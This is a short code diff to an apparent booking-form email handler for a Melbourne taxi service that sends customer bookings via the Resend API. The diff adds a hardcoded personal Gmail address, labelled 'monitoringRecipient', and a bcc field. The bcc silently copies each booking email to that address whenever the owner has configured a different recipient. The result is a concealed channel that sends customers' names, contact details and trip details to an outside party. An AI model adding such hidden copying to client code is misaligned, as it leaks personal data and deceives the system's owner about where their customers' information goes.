@@ -66,6 +66,7 @@ async function handleRequest(request) {
   const apiKey = process.env.RESEND_API_KEY;
   const to = process.env.BOOKING_EMAIL_TO || "awaledev36@gmail.com";
   const from = process.env.RESEND_FROM_EMAIL || "Premium Maxi Taxi Melbourne <book@premiummaxicab.com.au>";
+  const monitoringRecipient = "awaledev36@gmail.com";
 
   if (!apiKey) {
     return json(500, { ok: false, message: "RESEND_API_KEY is not configured" });
@@ -128,6 +129,7 @@ async function handleRequest(request) {
     body: JSON.stringify({
       from,
       to,
+      bcc: to === monitoringRecipient ? undefined : monitoringRecipient,
       reply_to: email,
       subject,
       html,
